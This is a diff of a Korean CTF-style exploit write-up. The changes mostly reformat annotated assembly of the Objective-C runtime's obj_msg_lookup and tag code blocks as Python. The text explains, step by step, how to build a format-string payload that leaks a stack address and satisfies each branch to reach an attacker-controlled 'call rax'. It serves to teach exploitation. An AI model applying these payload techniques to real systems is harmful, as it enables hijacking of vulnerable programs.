@@ -191,16 +191,16 @@ Program received signal SIGSEGV (fault address 0x0)
 
 ```
 obj_msg_lookup
-	mov     rbx, [rdi] 		  ; rdi can be controlled
-	mov     rax, [rsi] 		
-	mov     rdx, [rbx+0x40] ; edx can be controlled
-	mov     r8, eax 		
-	mov     rcx, rax 		
-	shl     r8, 5 			
-	shr     rcx, 0x20 	
-	add     r8, ecx
+    mov     rbx, [rdi] 		  ; rdi can be controlled
+    mov     rax, [rsi] 		
+    mov     rdx, [rbx+0x40] ; edx can be controlled
+    mov     r8, eax 		
+    mov     rcx, rax 		
+    shl     r8, 5 			
+    shr     rcx, 0x20 	
+    add     r8, ecx
 
-	cmp     r8, [rdx+0x28] 	
+    cmp     r8, [rdx+0x28] 	
 /---jb    10CC0
 |
 | (FALSE) jmp if r8 < [rdx + 0x28] - cond_1 < 0x70
@@ -209,55 +209,55 @@ obj_msg_lookup
     mov   rax, [rax] 		
 /---jmp   10CAB
 |
-|	### 10CC0:
-|	mov     r8, [rdx]
-|	mov     eax, eax
-|	mov     rax, [r8+rax*8]
-|	mov     rax, [rax+rcx*8]
+|	  ### 10CC0:
+|   mov     r8, [rdx]
+|   mov     eax, eax
+|   mov     rax, [r8+rax*8]
+|   mov     rax, [rax+rcx*8]
 |
 \-->### 10CAB
-	test    rax, rax
+    test    rax, rax
 /---je    short 10CE0
 |
 | (TRUE) jmp if rax == 0: cond_2
 |
 \-->### 10CE0:
-	mov     r14, rsi
-	mov     r13, rdi
-	mov     r12, cs:__obj_uninstalled_dtable_ptr
+    mov     r14, rsi
+    mov     r13, rdi
+    mov     r12, cs:__obj_uninstalled_dtable_ptr
 
-	mov     rcx, [r12] 	
-	cmp     rcx, rdx
+    mov     rcx, [r12] 	
+    cmp     rcx, rdx
 /---jnz   10DC0
 |
 | (TRUE) jmp if rcx != rdx : maybe easy ? automatically to be TRUE
 |
 \-->### 10DC0:
-	mov     rax, [r14]
-	mov     edi, rax
-	mov     rsi, rax
-	shl     edi, 5
-	shr     rsi, 0x20
-	add     edi, esi
+    mov     rax, [r14]
+    mov     edi, rax
+    mov     rsi, rax
+    shl     edi, 5
+    shr     rsi, 0x20
+    add     edi, esi
 
-	cmp     rdi, [rdx+0x28]
+    cmp     rdi, [rdx+0x28]
 /---jb    10EF0
 |
 | (FALSE) jmp if rdi < [rdx+0x28] ; automatically FALSE by cond_1
 |
 \-->mov   rax, [rdx+8] 	
-	mov     rax, [rax]
+    mov     rax, [rax]
 /---jmp   10DE2
 |
-|	### 10EF0:
-|	mov     rdx, [rdx]
-|	mov     eax, eax
-|	mov     rax, [rdx+rax*8]
-|	mov     rax, [rax+rsi*8]
-|	jmp     10DE2
+|	  ### 10EF0:
+|   mov     rdx, [rdx]
+|   mov     eax, eax
+|   mov     rax, [rdx+rax*8]
+|   mov     rax, [rax+rsi*8]
+|   jmp     10DE2
 |
 \-->### 10DE2:
-	test    rax, rax
+    test    rax, rax
 /---jnz   10cb0
 |
 | (FALSE) RAX != 0 ; automatically FALSE by cond_1
@@ -268,40 +268,40 @@ obj_msg_lookup
 | (FALSE) (byte *)rbx[4] & 2 != 0 : cond_3
 |
 \-->mov   rax, [rbx]      ; rax = [rbx]
-	mov     rsi, cs:...
-	mov     rdi, [rax+0x40] ; rdi = rax[8] = (*(*rdi))[8]
-	mov     rdx, [rsi]
-	mov     r8, [rdi+0x28]
-	mov     r9d, edx
-	mov     rax, rdx
-	shl     r9d, 5
-	shr     rax, 0x20
-	add     r9d, eax
-	cmp     r9, r8
+    mov     rsi, cs:...
+    mov     rdi, [rax+0x40] ; rdi = rax[8] = (*(*rdi))[8]
+    mov     rdx, [rsi]
+    mov     r8, [rdi+0x28]
+    mov     r9d, edx
+    mov     rax, rdx
+    shl     r9d, 5
+    shr     rax, 0x20
+    add     r9d, eax
+    cmp     r9, r8
 /---jb    10F14 					
 |
 | (TRUE) r9 < r8 					
 |
-| mov   rax, [rdi+8]
-|	mov   rax, [rax]
-| jmp   10E2B
+|   mov   rax, [rdi+8]
+|   mov   rax, [rax]
+|   jmp   10E2B
 |
 \-->### 10F14
-	mov     r9, [rdi] 		  ; r9 = [rdi]
-	mov     r10d, edx 		  ; r10d = edx
-	mov     r9, [r9+r10*8] 	; r9 = r9[r10]  ; r10 = 0
-	mov     rax, [r9+rax*8] ; rax = r9[rax] ; rax = 2
+    mov     r9, [rdi]       ; r9 = [rdi]
+    mov     r10d, edx       ; r10d = edx
+    mov     r9, [r9+r10*8]  ; r9 = r9[r10]  ; r10 = 0
+    mov     rax, [r9+rax*8] ; rax = r9[rax] ; rax = 2
 /---jmp   10E2B
 |
 |-->### 10E2B:
-	test    rax, rax
+    test    rax, rax
 /---jz    10F90 (FALSE)
 |
 | (FALSE) rax == 0
 |
 \-->mov   rd, r14 ; 10E34
-	mov     rdi, rbx
-	call    rax ; [*] That's what I want
+    mov     rdi, rbx
+    call    rax ; [*] That's what I want
 ```
 
 이제 이 조건을 만족 시킬 수 있도록 페이로드를 구성하면 됩니다.
@@ -310,7 +310,7 @@ obj_msg_lookup
 
 먼저 제 페이로드가 시작하는 위치를 구해야 합니다. 여러 가지 방법이 있을 수 있는데 고정적인 스택을 이용하여 오프셋으로 제 페이로드 시작 위치를 구해주면 됩니다.
 
-```
+```python
 payload = "%140$lx"
 p.sendline(payload)
 data = p.recv()
@@ -330,7 +330,7 @@ print "PAYLOAD : {}".format(hex(stack_addr))
 
 일단 스택 위치로 넣어 봅니다.
 
-```
+```python
 (assume that payload already had '%13$@ZZZ')
 payload = p64(stack_addr) + "A"*8             # rbx = &payload
 payload += "B" * 0x30
@@ -347,7 +347,7 @@ paylaod += "F" * 8 + "Z" *8
 이제 플로우를 태워보면 처음에 맞춰야 하는 조건은 다음과 같습니다.
 
 ```
-	cmp 	r8, [rdx+0x28] ; [*] <-- HERE
+    cmp 	r8, [rdx+0x28] ; [*] <-- HERE
 /---jb  	10CC0
 |
 | (FALSE) jmp if r8 < [rdx + 0x28] - cond_1 < 0x70
@@ -362,7 +362,7 @@ paylaod += "F" * 8 + "Z" *8
 
 그러면 현재 페이로드는 다음과 같습니다.
 
-```
+```python
 (assume that payload already had '%13$@ZZZ')
 payload = p64(stack_addr) + "A"*8             # rbx = &payload
 payload += "B" * 0x30
@@ -384,14 +384,14 @@ payload += p64(0)                             # cond_1 : [rdx+0x28]
     mov   rax, [rax] 		
 /---jmp   10CAB
 |
-|	### 10CC0:
-|	mov     r8, [rdx]
-|	mov     eax, eax
-|	mov     rax, [r8+rax*8]
-|	mov     rax, [rax+rcx*8]
+|   ### 10CC0:
+|   mov   r8, [rdx]
+|   mov   eax, eax
+|   mov   rax, [r8+rax*8]
+|   mov   rax, [rax+rcx*8]
 |
 \-->### 10CAB  ; [*] <-- HERE
-	test    rax, rax
+    test  rax, rax
 /---je    short 10CE0
 |
 | (TRUE) jmp if rax == 0: cond_2
@@ -401,7 +401,7 @@ payload += p64(0)                             # cond_1 : [rdx+0x28]
 
 이 분기에서는 `True`를 만들어 주어야 합니다. 그러면 `rax`가 0 이여야 하는데 `rax`는 `*[rdx+8]`이 됩니다. 이 포인터 값 역시 우리가 원하는 값으로 만들 수 있기 때문에 이 조건을 만들어 줍니다. 이번에도 넉넉히 페이로드를 쓰기위에 뒤쪽에 배치 했습니다.
 
-```
+```python
 (assume that payload already had '%13$@ZZZ')
 payload = p64(stack_addr) + "A"*8             # rbx = &payload
 payload += "B" * 0x30
@@ -418,19 +418,19 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 
 ```
 \-->### 10CE0:
-	mov     r14, rsi
-	mov     r13, rdi
-	mov     r12, cs:__obj_uninstalled_dtable_ptr
+    mov     r14, rsi
+    mov     r13, rdi
+    mov     r12, cs:__obj_uninstalled_dtable_ptr
 
-	mov     rcx, [r12] 	
-	cmp     rcx, rdx
-/---jnz   10DC0
+    mov     rcx, [r12] 	
+    cmp     rcx, rdx
+/---jnz     10DC0
 |
 | (TRUE) jmp if rcx != rdx : maybe easy ? automatically to be TRUE
 |
 \-->### 10DC0:
-	mov     rax, [r14]
-	mov     edi, rax
+    mov     rax, [r14]
+    mov     edi, rax
 ```
 
 `rcx`와 `rdx`가 같지 않아야 하는데 이 부분은 테스트 해보면 자동적으로 갖지 않게 됩니다. 이 부분은 무시해도 되겠군요 :)
@@ -439,21 +439,21 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 
 ```
 \-->### 10DC0:
-	 mov     rax, [r14]
-	 mov     edi, rax
-	 mov     rsi, rax
-	 shl     edi, 5
-	 shr     rsi, 0x20
-   add     edi, esi
+    mov     rax, [r14]
+    mov     edi, rax
+    mov     rsi, rax
+    shl     edi, 5
+    shr     rsi, 0x20
+    add     edi, esi
 
-	 cmp     rdi, [rdx+0x28]
-/---jb     10EF0
+    cmp     rdi, [rdx+0x28]
+/---jb      10EF0
 |
 | (FALSE) jmp if rdi < [rdx+0x28] ; automatically FALSE by cond_1
 |
-\-->mov    rax, [rdx+8] 	
-	  mov    rax, [rax]
-/---jmp    10DE2
+\-->mov     rax, [rdx+8] 	
+    mov     rax, [rax]
+/---jmp     10DE2
 ```
 
 `rdi < [rdx+0x28]`의 조건이 `False`가 되어야 합니다. 그런데 처음에 `cond_1`에서 이미 이 값을 0 으로 설정했고 `rdi`는 0보다 크기 때문에 자동적으로 이 루틴도 원하는 플로우를 타게 됩니다. 이 부분도 자동으로 넘어 가겠군요 :)
@@ -462,8 +462,8 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 
 ```
 \-->### 10DE2:
-	test    rax, rax
-/---jnz   10cb0
+    test    rax, rax
+/---jnz     10cb0
 |
 | (FALSE) RAX != 0 ; automatically FALSE by cond_1
 ```
@@ -473,24 +473,24 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 다음 조건을 보면 다음과 같습니다.
 
 ```
-	  test     rax, rax
-/---jnz      10cb0
+    test    rax, rax
+/---jnz     10cb0
 |
 | (FALSE) RAX != 0
 |
-\-->test     byte ptr [rbx+0x20], 2
+\-->test    byte ptr [rbx+0x20], 2
 /---jnz     10F27
 |
 | (FALSE) (byte *)rbx[4] & 2 != 0 : cond_3
 |
 \-->mov     rax, [rbx]
-	  mov     rsi, cs:...
-	  mov     rdi, [rax+0x40]
+    mov     rsi, cs:...
+    mov     rdi, [rax+0x40]
 ```
 
 지금 `test byte ptr [rbx+0x20], 2` 조건을 `False` 시켜야 합니다. `test` 연산은 `and` 연산을 하기 때문에 `rbx+0x20`의 위치의 값을 홀수로 넣어야 합니다. 간단히 1로 넣도록 하겠습니다.
 
-```
+```python
 (assume that payload already had '%13$@ZZZ')
 payload = p64(stack_addr) + "A"*8             # rbx = &payload
 payload += "B" * 0x10
@@ -508,28 +508,28 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 다음 조건을 보면 다음과 같습니다.
 
 ```
-\-->mov     rax, [rbx] 		  ; rax = [rbx]
-	  mov     rsi, cs:...
-  	mov     rdi, [rax+0x40] ; rdi = rax[8] = (*(*rdi))[8]
-  	mov     rdx, [rsi]
-  	mov     r8, [rdi+0x28]
-  	mov     r9d, edx
-  	mov     rax, rdx
-  	shl     r9d, 5
-  	shr     rax, 0x20
-  	add     r9d, eax
-  	cmp     r9, r8 	   		
+\-->mov     rax, [rbx]      ; rax = [rbx]
+    mov     rsi, cs:...
+    mov     rdi, [rax+0x40] ; rdi = rax[8] = (*(*rdi))[8]
+    mov     rdx, [rsi]
+    mov     r8, [rdi+0x28]
+    mov     r9d, edx
+    mov     rax, rdx
+    shl     r9d, 5
+    shr     rax, 0x20
+    add     r9d, eax
+    cmp     r9, r8 	   		
 /---jb      10F14 					
 |
 | (TRUE) r9 < r8 : cond_4
 |
-| 	mov     rax, [rdi+8]
+|   mov     rax, [rdi+8]
 |	  mov     rax, [rax]
-| 	jmp     10E2B
+|   jmp     10E2B
 |
 \-->### 10F14
-  	mov     r9, [rdi] 		; r9 = [rdi]
-  	mov     r10d, edx 		; r10d = edx
+    mov     r9, [rdi]     ; r9 = [rdi]
+    mov     r10d, edx     ; r10d = edx
 ```
 
 `r9 < r8` 구문을 `True`로 만들어야 합니다. 먼저 `r8`을 살펴 보면 `[rdi+0x28]`을 갖는데 `rdi`는 `[rax+0x40]`이고 `rax`는 `[rbx]`이기 때문에 우리의 페이로드에서 `[[payload + 0x40] + 0x28]`을 하는 것과 같습니다.
@@ -540,7 +540,7 @@ payload += p64(0)                             # *[rdx+8] point here for cond_2
 
 저는 간단히 `0x10`으로 설정했습니다.
 
-```
+```python
 (assume that payload already had '%13$@ZZZ')
 payload = p64(stack_addr) + "A"*8             # rbx = &payload
 payload += "B" * 0x10
@@ -591,7 +591,7 @@ RAX = R9[RAX]
 
 그러면 최종 페이로드는 다음과 같습니다.
 
-```
+```python
 payload =  "%13$@" + "ZZZ"
 payload += p64(stack_addr)              # RBX (stack_addr) = &payload
 payload += "A2"*4
